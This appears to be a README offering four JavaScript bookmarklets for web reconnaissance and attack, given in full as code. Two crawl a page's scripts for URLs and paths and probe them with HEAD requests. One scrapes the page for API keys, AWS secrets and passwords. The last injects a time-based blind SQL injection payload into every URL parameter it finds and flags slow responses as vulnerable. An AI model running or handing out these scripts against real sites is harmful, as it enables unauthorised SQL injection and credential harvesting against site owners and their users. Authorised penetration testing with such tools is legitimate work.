# JS-Bookmarklet

## JS URL
```
javascript:(function(){var toast=document.createElement("div");toast.textContent="Scanning Started...";toast.style.cssText="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#4CAF50;color:white;padding:10px 20px;border-radius:5px;font-family:sans-serif;box-shadow:0 2px 10px rgba(0,0,0,0.2);z-index:9999;opacity:1;";document.body.appendChild(toast);var scripts=document.getElementsByTagName("script"),urlRegex=/(?<=("|\%27|\%60))(https?:\/\/[a-zA-Z0-9_?&=\/\-\#\.]+|\/[^\"\'\%60\s]*)/g,urls=new Set(),details=new Map(),excludedExtensions=['.png','.svg','.jpg','.jpeg','.gif','.css','.woff','.woff2','.webp'];function processContent(t){for(let match of t.matchAll(urlRegex)){let url=match[0];if((url.startsWith("http")||url.startsWith("/")||url.startsWith("./")||url.startsWith("../"))&&!excludedExtensions.some(ext=>url.endsWith(ext)))urls.add(url);}}async function fetchUrlDetails(url){try{const response=await fetch(url,{method:'HEAD'});details.set(url,{status:response.status,type:response.headers.get('content-type')||'Unknown',size:response.headers.get('content-length')||'Unknown'});}catch(e){details.set(url,{status:"Error",type:"Unknown",size:"Unknown"});}}for(var i=0;i<scripts.length;i++){var t=scripts[i].src;if(t){if(t.startsWith("http")||t.startsWith("/")||t.startsWith("./")||t.startsWith("../")){if(!excludedExtensions.some(ext=>t.endsWith(ext)))urls.add(t);}fetch(t).then(t=>t.text()).then(text=>processContent(text,t)).catch(t=>console.log("An error occurred: ",t));}else{processContent(scripts[i].textContent);}}processContent(document.documentElement.outerHTML,"Page content");async function displayResults(){await Promise.all(Array.from(urls).map(url=>{var fullUrl=url.startsWith("http")?url:window.location.origin+url;return fetchUrlDetails(fullUrl);}));var div=document.createElement("div");div.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:80%;height:70%;background:#f0f8ff;color:#333;overflow:auto;z-index:9999;padding:20px;font-family:Arial,sans-serif;border-radius:15px;box-shadow:0 0 15px rgba(0,0,0,0.5);";var content="<h2 style='color:#4a69bd;'>URLs Found ("+urls.size+")</h2>";content+="<table style='width:100%;border-collapse:collapse;'><tr><th>No</th><th>URL</th><th>Status</th><th>Size</th></tr>";let index=1;let sortedDetails=Array.from(details.entries()).sort((a,b)=>{let statusA=isNaN(a[1].status)?Infinity:parseInt(a[1].status);let statusB=isNaN(b[1].status)?Infinity:parseInt(b[1].status);return statusA-statusB});sortedDetails.forEach(([url,info])=>{content+=%60<tr><td style='border:1px solid #ddd;padding:8px;'>${index++}</td><td style='border:1px solid #ddd;padding:8px;'><a href="${url}" target="_blank" style="color:blue;text-decoration:none;">${url}</a></td><td style='border:1px solid #ddd;padding:8px;'>${info.status}</td><td style='border:1px solid #ddd;padding:8px;'>${info.size}</td></tr>%60;});content+="</table>";div.innerHTML=content;var closeBtn=document.createElement("button");closeBtn.textContent="Close";closeBtn.style.cssText="position:fixed;top:10px;right:10px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";closeBtn.onclick=function(){document.body.removeChild(div);document.body.removeChild(closeBtn);document.body.removeChild(exportBtn);};var exportBtn=document.createElement("button");exportBtn.textContent="Export URLs";exportBtn.style.cssText="position:fixed;top:10px;right:80px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";exportBtn.onclick=function(){var blob=new Blob([Array.from(urls).join("\n")],{type:"text/plain"});var link=document.createElement("a");link.href=URL.createObjectURL(blob);link.download="urls.txt";link.click();};document.body.appendChild(exportBtn);document.body.appendChild(closeBtn);document.body.appendChild(div);toast.textContent="Scan Completed";setTimeout(function(){toast.style.opacity="0";setTimeout(function(){toast.remove();},500);},3000);}setTimeout(displayResults,500);})();
```

## JS PATH
```
javascript:(function(){var toast=document.createElement("div");toast.textContent="Scanning Started...";toast.style.cssText="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#4CAF50;color:white;padding:10px 20px;border-radius:5px;font-family:sans-serif;box-shadow:0 2px 10px rgba(0,0,0,0.2);z-index:9999;opacity:1;";document.body.appendChild(toast);var scripts=document.getElementsByTagName("script"),urlRegex=/(?<=("|\%27|\%60))(\/[^\"\%27\%60\s]*|(?:\/|\.\.\/|\.\/)[^\"\%27\%60\s]*)/g;const paths=new Set();const excludedExtensions = ['.png', '.svg', '.jpg', '.jpeg', '.gif', '.css','.woff','.woff2','.webp'];function processContent(t,src){for(let match of t.matchAll(urlRegex)){let path=match[0];if(path.startsWith("/") || path.startsWith("./") || path.startsWith("../")){if(!excludedExtensions.some(ext => path.endsWith(ext))){paths.add(path);}}}}for(var i=0;i<scripts.length;i++){var t=scripts[i].src;if(t){if(t.startsWith("/") || t.startsWith("./") || t.startsWith("../")){if(!excludedExtensions.some(ext => t.endsWith(ext))){paths.add(t);}}fetch(t).then(function(t){return t.text()}).then(text=>processContent(text,t)).catch(function(t){console.log("An error occurred: ",t)});}else{processContent(scripts[i].textContent);}}processContent(document.documentElement.outerHTML,"Page content");async function fetchPathDetails(path){try{const response=await fetch(path,{method:'HEAD'});const status=parseInt(response.status)||Infinity;const size=response.headers.get('content-length')||'Unknown';return{status,size}}catch(e){return{status:Infinity,size:"Unknown"}}}async function displayResults(){var div=document.createElement("div");div.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#f0f8ff;color:#333;overflow:auto;z-index:9999;padding:30px 50px;width:80%;height:70%;max-height:600px;max-width:900px;font-family:Arial,sans-serif;box-shadow:0 2px 15px rgba(0,0,0,0.3);border-radius:15px;";var content="<h2 style='color:#4a69bd;'>Unique Paths Found ("+paths.size+")</h2><table style='width:100%;border-collapse:collapse;'><tr><th>No</th><th>Unique Paths</th><th>Status</th><th>Size</th></tr>";let index=1;let fetchDetails=Array.from(paths).map(async(path)=>{const details=await fetchPathDetails(path);return{path,details}});let results=await Promise.all(fetchDetails);results=results.sort((a,b)=>a.details.status-b.details.status);results.forEach(({path,details})=>{content+=%60<tr><td style='border:1px solid #ddd;padding:8px;'>${index++}</td><td style='border:1px solid #ddd;padding:8px;'><a href="${path}" target="_blank" style="color:blue;text-decoration:none;">${path}</a></td><td style='border:1px solid #ddd;padding:8px;'>${details.status}</td><td style='border:1px solid #ddd;padding:8px;'>${details.size}</td></tr>%60});content+="</table>";div.innerHTML=content;var closeBtn=document.createElement("button");closeBtn.textContent="Close";closeBtn.style.cssText="position:fixed;top:10px;right:10px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";closeBtn.onclick=function(){document.body.removeChild(div);document.body.removeChild(closeBtn);document.body.removeChild(exportBtn)};var exportBtn=document.createElement("button");exportBtn.textContent="Export Paths";exportBtn.style.cssText="position:fixed;top:10px;right:80px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";exportBtn.onclick=function(){var blob=new Blob([Array.from(paths).join("\n")],{type:"text/plain"});var link=document.createElement("a");link.href=URL.createObjectURL(blob);link.download="paths.txt";link.click()};document.body.appendChild(exportBtn);document.body.appendChild(closeBtn);document.body.appendChild(div);toast.textContent="Scan Completed";setTimeout(function(){toast.style.opacity="0";setTimeout(function(){toast.remove()},500)},3000)}setTimeout(displayResults,500)})();
```

## JS LEAKS
```
javascript:(function(){var toast=document.createElement("div");toast.textContent="Scanning for Credentials...";toast.style.cssText="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#4CAF50;color:white;padding:10px 20px;border-radius:5px;font-family:sans-serif;box-shadow:0 2px 10px rgba(0,0,0,0.2);z-index:9999;opacity:1;";document.body.appendChild(toast);var credentialsRegex=/(?:access_key|access_token|api_key|api_secret|auth_token|client_secret|secret_key|private_key|password|credential|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY|AWS_SECRET_KEY)\s*[:=]\s*["']?([a-zA-Z0-9\-_\.]+)["']?/gi;var credentials=new Set();function processContent(content){for(let match of content.matchAll(credentialsRegex)){credentials.add(%60${match[0]}%60);}}async function fetchExternalScripts(){return Promise.all(Array.from(document.querySelectorAll("script[src]")).map(script=>fetch(script.src).then(res=>res.text()).then(content=>processContent(content)).catch(()=>console.log(%60Failed to fetch: ${script.src}%60))));}function scanPage(){processContent(document.documentElement.outerHTML);Array.from(document.querySelectorAll("script:not([src])")).forEach(script=>processContent(script.textContent));fetchExternalScripts().then(()=>{displayResults();});}function displayResults(){var div=document.createElement("div");div.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#f0f8ff;color:#333;overflow:auto;z-index:9999;padding:30px 50px;width:80%;height:70%;max-height:600px;max-width:900px;font-family:Arial,sans-serif;box-shadow:0 2px 15px rgba(0,0,0,0.3);border-radius:15px;";var content="<h2 style='color:#4a69bd;'>Leaked Credentials Found ("+credentials.size+")</h2><table style='width:100%;border-collapse:collapse;'><tr><th>No</th><th>Value</th></tr>";let index=1;Array.from(credentials).forEach(credential=>{content+=%60<tr><td style='border:1px solid #ddd;padding:8px;'>${index++}</td><td style='border:1px solid #ddd;padding:8px;'>${credential}</td></tr>%60;});content+="</table>";div.innerHTML=content;var closeBtn=document.createElement("button");closeBtn.textContent="Close";closeBtn.style.cssText="position:fixed;top:10px;right:10px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";closeBtn.onclick=function(){document.body.removeChild(div);document.body.removeChild(closeBtn);document.body.removeChild(exportBtn);};var exportBtn=document.createElement("button");exportBtn.textContent="Export Credentials";exportBtn.style.cssText="position:fixed;top:10px;right:150px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";exportBtn.onclick=function(){var blob=new Blob([Array.from(credentials).join("\n")],{type:"text/plain"});var link=document.createElement("a");link.href=URL.createObjectURL(blob);link.download="leaked_credentials.txt";link.click();};document.body.appendChild(exportBtn);document.body.appendChild(closeBtn);document.body.appendChild(div);toast.textContent="Scan Completed";setTimeout(function(){toast.style.opacity="0";setTimeout(function(){toast.remove();},500);},3000);}scanPage();})();
```

## JS SQLI
```
javascript:(async function(){var toast=document.createElement("div");toast.textContent="Scanning Started...";toast.style.cssText="position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#4CAF50;color:white;padding:10px 20px;border-radius:5px;font-family:sans-serif;box-shadow:0 2px 10px rgba(0,0,0,0.2);z-index:9999;opacity:1;";document.body.appendChild(toast);var urlRegex=/(https?:\/\/[^\s"'<>]+|\/[^\s"'<>]+)/g,urls=new Set(),details=new Map(),excludedExtensions=['.png','.svg','.jpg','.jpeg','.gif','.css','.woff','.woff2','.webp'];function extractUrls(content){(content.match(urlRegex)||[]).forEach(url=>{if((url.startsWith("http")||url.startsWith("/")||url.startsWith("./")||url.startsWith("../"))&&!excludedExtensions.some(ext=>url.endsWith(ext)))urls.add(url);});}async function testSQLInjection(url, param, baseUrl){try{const payload=encodeURIComponent("'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z");const startTime=Date.now();const fullUrl=url.includes('?')?url.replace(new RegExp(%60(${param}=)[^&]+%60),%60$1${payload}%60):%60${url}?${param}=${payload}%60;const response=await fetch(fullUrl,{method:'GET'});const elapsedTime=(Date.now()-startTime)/1000;if(elapsedTime>=5){details.set(fullUrl,{status:"Vulnerable",time:elapsedTime+"s"});}else{details.set(fullUrl,{status:"Not Vulnerable",time:elapsedTime+"s"});}}catch(e){details.set(url,{status:"Error",time:"N/A"});}}function extractParams(url){let params = new URLSearchParams(url.split('?')[1]);return Array.from(params.keys());}urls.add(window.location.href);extractUrls(document.documentElement.outerHTML);async function displayResults(){await Promise.all(Array.from(urls).map(url=>{let params=extractParams(url);return Promise.all(params.map(param=>testSQLInjection(url, param, url)));}));var resultDiv=document.createElement("div");resultDiv.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:80%;height:70%;background:#f0f8ff;color:#333;overflow:auto;z-index:9999;padding:20px;font-family:sans-serif;border-radius:15px;box-shadow:0 0 15px rgba(0,0,0,0.5);";var content="<h2 style='color:#4a69bd;'>SQL Injection Test Results</h2>";content+="<table style='width:100%;border-collapse:collapse;'><tr><th>No</th><th>URL</th><th>Status</th><th>Response Time</th></tr>";let index=1;let sortedDetails=Array.from(details.entries()).sort((a,b)=>{let order={"Vulnerable":1,"Not Vulnerable":2,"Error":3};return order[a[1].status]-order[b[1].status];});sortedDetails.forEach(([url,info])=>{content+=%60<tr><td style='border:1px solid #ddd;padding:8px;'>${index++}</td><td style='border:1px solid #ddd;padding:8px;'><a href="${url}" target="_blank" style="color:blue;text-decoration:none;">${url}</a></td><td style='border:1px solid #ddd;padding:8px;'>${info.status}</td><td style='border:1px solid #ddd;padding:8px;'>${info.time}</td></tr>%60;});content+="</table>";resultDiv.innerHTML=content;var closeBtn=document.createElement("button");closeBtn.textContent="Close";closeBtn.style.cssText="position:fixed;top:10px;right:10px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";closeBtn.onclick=function(){document.body.removeChild(resultDiv);document.body.removeChild(closeBtn);};var exportBtn=document.createElement("button");exportBtn.textContent="Export Results";exportBtn.style.cssText="position:fixed;top:10px;right:80px;background:#4a69bd;color:white;border:none;padding:10px 20px;cursor:pointer;z-index:10000;";exportBtn.onclick=function(){var blob=new Blob([Array.from(details.entries()).map(([url,info])=>%60${url},${info.status},${info.time}%60).join("\n")],{type:"text/plain"});var link=document.createElement("a");link.href=URL.createObjectURL(blob);link.download="sql_injection_results.csv";link.click();};document.body.appendChild(exportBtn);document.body.appendChild(closeBtn);document.body.appendChild(resultDiv);toast.textContent="Scan Completed";setTimeout(()=>{toast.style.opacity="0";setTimeout(()=>{toast.remove();},500);},3000);}setTimeout(displayResults,500);})();
```
